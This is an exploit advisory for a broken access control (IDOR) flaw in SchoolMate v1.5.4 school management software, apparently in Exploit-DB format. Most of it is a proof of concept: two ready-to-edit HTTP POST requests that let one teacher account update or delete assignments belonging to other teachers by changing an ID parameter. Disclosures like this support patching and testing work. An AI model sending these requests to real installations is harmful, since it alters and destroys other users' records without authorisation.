# Exploit Title: SchoolMate v1.5.4 - Insecure Direct Object Reference(IDOR)
## Date: 4/1/2024
## Vendor Homepage: https://sourceforge.net/projects/schoolmate/files/latest/download
## Tested on: Debian Linux, Apache, Mysql
## Vendor: SchoolMate
## Version: v1.5.4
## Exploit Description:
## SchoolMate v1.5.4 suffers from IDOR - Broken Access Control Vulnerability allowing attacker teacher to update and delete assignment that is assigned by other teacher in other class(horizontal privilege escalation).

## ---------------------------------POC-----------------------------
```
POST /index.php HTTP/1.1
...

title=1&task=2023-10-07&total=1&assigneddate=%2F%2Fassign1&duedate=00%2F%2F20&editassignment=1&assignmentid=1(CHANGE HERE)&page2=2&selectclass=1&logout=&wastotal=1&wasdate=20.00&page=2
```

```
POST /index.php HTTP/1.1
...
delete%5B%5D=2(CHANGE HERE)&deleteassignment=1&selectassignment=1&page2=2&onpage=1&logout=&selectclass=2&page=2
```